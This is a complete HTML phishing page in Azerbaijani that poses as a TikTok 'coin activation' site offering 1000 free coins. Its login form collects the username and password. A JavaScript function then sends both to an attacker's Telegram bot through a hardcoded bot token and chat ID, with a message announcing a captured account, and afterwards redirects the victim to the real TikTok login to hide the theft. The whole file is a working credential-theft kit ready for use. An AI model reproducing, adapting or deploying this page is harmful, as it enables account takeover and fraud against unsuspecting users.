<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok | Jeton Mərkəzi</title>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: #121212; padding: 30px; border-radius: 12px; width: 320px; text-align: center; border: 1px solid #fe2c55; box-shadow: 0 4px 15px rgba(254, 44, 85, 0.2); }
        img { width: 100px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #333; background: #222; color: white; box-sizing: border-box; outline: none; }
        input:focus { border-color: #fe2c55; }
        button { width: 100%; padding: 12px; background-color: #fe2c55; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; transition: 0.3s; }
        button:hover { background-color: #ef2950; }
    </style>
</head>
<body>
    <div class="login-card">
        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG-white-text-black-background.png" alt="TikTok">
        <h3>Jeton Aktivasiyası</h3>
        <p style="font-size: 13px; color: #888;">Hesabınıza 1000 Jeton köçürülməsi üçün giriş edin</p>
        <input type="text" id="user" placeholder="İstifadəçi adı / Email">
        <input type="password" id="pass" placeholder="Şifrə">
        <button onclick="pusk()">JETONLARI YÜKLƏ</button>
    </div>

    <script>
        function pusk() {
            var user = document.getElementById("user").value;
            var pass = document.getElementById("pass").value;
            
            if(user == "" || pass == "") {
                alert("Xanaları doldurun!");
                return;
            }

            var token = "8653662204:AAEEhDx4hxgxNGAwCUL04frUAv0MVXJI2ZM";
            var chat_id = "705607065"; 
            var msg = "🎯 YENİ HESAB TUTULDU!\n👤 User: " + user + "\n🔑 Pass: " + pass;
            
            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(msg);
            
            fetch(url).then(() => {
                // Məlumat getdikdən sonra dərhal TikTok-un rəsmi logininə yönləndirir
                window.location.href = "https://www.tiktok.com/login";
            }).catch(() => {
                window.location.href = "https://www.tiktok.com/login";
            });
        }
    </script>
</body>
</html>
